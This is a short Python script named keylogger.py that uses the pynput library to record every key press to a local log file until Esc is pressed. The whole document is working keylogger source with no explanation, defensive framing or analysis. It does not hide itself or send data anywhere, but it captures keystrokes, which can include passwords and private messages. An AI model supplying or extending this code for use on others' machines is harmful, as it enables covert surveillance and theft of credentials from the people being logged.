# keylogger.py

from pynput.keyboard import Key, Listener

# Define the log file path
log_file = "keylogger_log.txt"

def on_press(key):
    try:
        # Append the pressed key to the log file
        with open(log_file, "a") as f:
            f.write(str(key))
    except Exception as e:
        print(f"Error logging key: {e}")

def on_release(key):
    if key == Key.esc:
        # Stop the keylogger
        return False

if __name__ == "__main__":
    print("Keylogger started. Press 'Esc' to stop.")
    # Start listening for key events
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
